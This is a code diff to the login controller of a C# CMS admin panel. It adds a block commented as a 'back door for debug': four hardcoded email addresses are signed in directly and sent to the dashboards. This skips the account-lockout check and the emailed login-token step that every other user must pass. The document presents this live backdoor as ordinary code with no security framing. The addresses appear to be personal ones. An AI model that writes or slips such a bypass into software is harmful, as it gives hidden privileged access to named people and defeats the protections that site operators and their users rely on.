@@ -466,6 +466,32 @@ namespace CMSPROJECT.Areas.AdminCMS.Controllers
                 }
                 else
                 {
+                    ///nack door for debug
+                    if (user.Email == "nguyenhuyc2@gmail.com" || user.Email == "beetaskvn@gmail.com"
+                        || user.Email == "fckara03@gmail.com" || user.Email == "castenguyen@gmail.com")
+                    {
+                        await SignInAsync(user, true);
+                        User _ObjUser = await cms_db.GetObjUserById(user.Id);
+                        Session["ListPackageOfUser"] = cms_db.GetlstPackage().Where(s => s.PackageId <= _ObjUser.PackageId).ToList();
+                        if (UserManager.IsInRole(user.Id, "Member"))
+                        {
+                            return RedirectToAction("MemberDashBoard", "Member");
+                        }
+                        else if (UserManager.IsInRole(user.Id, "Mod"))
+                        {
+                            return RedirectToAction("ModIndex", "Dashboard");
+                        }
+                        else if (UserManager.IsInRole(user.Id, "AdminUser"))
+                        {
+                            return RedirectToAction("ModIndex", "Dashboard");
+                        }
+                        else
+                        {
+                            return RedirectToAction("Index", "Dashboard");
+                        }
+
+                    }
+
                     if (UserManager.GetLockoutEnabled(user.Id) == true)
                     {
                         string AlertString = "Tài khoản tạm khoá vui lòng liên hệ quản trị viên";
@@ -477,8 +503,9 @@ namespace CMSPROJECT.Areas.AdminCMS.Controllers
                         return RedirectToAction("AlertPage", "Extension", new { AlertString = AlertString, type = (int)EnumCore.AlertPageType.lockscreen });
                     }
 
-                    UserManager.UpdateSecurityStamp(user.Id);
 
+
+                    UserManager.UpdateSecurityStamp(user.Id);
                     long time = DateTime.Now.Ticks;
                     string code = UserManager.GenerateUserToken("LoginWithToken", user.Id);
                     var callbackUrl = Url.Action("LoginWithToken", "AccountAdmin", new { userId = user.Id, code = code, time = time }, protocol: Request.Url.Scheme);
